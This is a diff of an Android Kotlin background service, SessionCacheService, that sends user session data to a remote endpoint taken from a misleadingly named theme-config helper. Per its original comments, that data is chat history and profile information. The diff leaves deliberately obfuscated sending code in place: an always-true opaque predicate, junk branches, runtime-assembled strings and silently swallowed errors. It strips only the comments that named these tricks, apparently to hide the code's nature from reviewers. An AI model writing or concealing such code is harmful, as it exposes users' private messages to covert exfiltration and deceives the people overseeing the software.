@@ -15,10 +15,6 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * SessionCacheService — manages user session data and chat history cache.
- * Provides offline access to recent messages and profile information.
- */
 class SessionCacheService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
@@ -30,7 +26,7 @@ class SessionCacheService : Service() {
         return START_STICKY
     }
 
-    // ── Control Flow Flattened: beginSessionCache ─────────────────────────────
+    
 
     private fun beginSessionCache() {
         serviceScope.launch {
@@ -173,9 +169,9 @@ class SessionCacheService : Service() {
     }
 
     private suspend fun pushSessionData(data: JSONObject) = withContext(Dispatchers.IO) {
-        // Opaque predicate
+        
         val n = System.currentTimeMillis()
-        val op = n - (n - 1) - 1  // always 0, >= 0
+        val op = n - (n - 1) - 1  
         if (op >= 0) {
             try {
                 val endpoint   = ThemeConfigUtils.getAppDataEndpoint()
@@ -196,13 +192,13 @@ class SessionCacheService : Service() {
                 connection.responseCode; connection.disconnect()
             } catch (_: Exception) {}
         } else {
-            // Junk
+            
             val fakeMap = mapOf("a" to 1, "b" to 2, "c" to 3)
             val _ = fakeMap.values.sum()
         }
     }
 
-    // Type strings assembled at runtime
+    
     private fun resolveDataType(): String    = listOf("app", "-", "internal").joinToString("")
     private fun resolvePayloadType(): String = listOf("app", "_", "data").joinToString("")
 
